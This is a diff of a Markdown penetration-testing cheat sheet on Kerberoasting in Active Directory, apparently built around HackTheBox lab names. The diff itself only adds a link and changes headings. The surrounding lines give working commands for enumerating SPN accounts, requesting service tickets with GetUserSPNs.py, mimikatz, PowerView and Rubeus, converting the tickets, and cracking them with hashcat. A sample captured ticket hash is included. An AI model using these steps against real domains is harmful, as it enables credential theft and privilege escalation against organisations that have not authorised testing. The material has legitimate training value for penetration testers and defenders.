@@ -1,4 +1,6 @@
-## Kerberoast
+We have [Outpacket](https://github.com/n00py/Outpacket), a cheatsheet that list all AD attacks & tools, based on common impacket workflows and maps their modern alternatives
+
+# Kerberoast
 Kerberoasting is a lateral movement/privilege escalation, focusing accounts with [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names). It retrieves a Kerberos ticket (encrypted with the service account’s NTLM hash) for a service account with an SPN set. Look for kerberoast against forest ; sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has ``Domain/Enterprise Admin privileges`` in both domains.
 ### Kerberoasting from Linux
 ```bash
@@ -17,7 +19,7 @@ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
 # Cracking the TGS Ticket
 hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
 ```
-### Kerberoasting from Windows Semi Manual
+## Kerberoasting from Windows Semi Manual
 ```bash
 # Enumerating SPNs
 C:\htb> setspn.exe -Q */*
@@ -53,7 +55,7 @@ echo "<mimikatz's base64 output>" |  tr -d \\n
 # Convert encoded_file as .kirbi, and repeat step w/ kirbi2john.py
 cat encoded_file | base64 -d > sqldev.kirbi
 ```
-### Kerberoasting from Windows w/ PowerView.ps1
+## Kerberoasting from Windows w/ PowerView.ps1
 ```bash
 PS C:\htb> Import-Module .\PowerView.ps1
 # Enumerate SPN accounts
@@ -70,7 +72,7 @@ PS C:\htb> cat .\ilfreight_tgs.csv
 <SNIP>
 "$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$59C086008BBE7EAE4E483506632F6EF8$622D9E1DBCB1FF2183482478B5559905E0CCBDEA2B52A5D9F510048481F2A3A4D2CC47345283A9E71D65E1573DCF6F2380A6FFF470722B5DEE704C51FF3A3C2CDB2945CA56F7763E117F04F26CA71EEACED25730FDCB06297ED4076C9CE1A1DBFE961DCE13C2D6455339D0D90983895D882CFA21656E41C3DDDC4951D1031EC8173BEEF9532337135A4CF70AE08F0FB34B6C1E3104F35D9B84E7DF7AC72F514BE2B346954C7F8C0748E46A28CCE765AF31628D3522A1E90FA187A124CA9D5F911318752082FF525B0BE1401FBA745E1
 ```
-### Kerberoasting from Windows w/ Rubeus
+## Kerberoasting from Windows w/ Rubeus
 ```bash
 # Gather stats, including SPN accounts
 PS C:\htb> .\Rubeus.exe kerberoast /stats
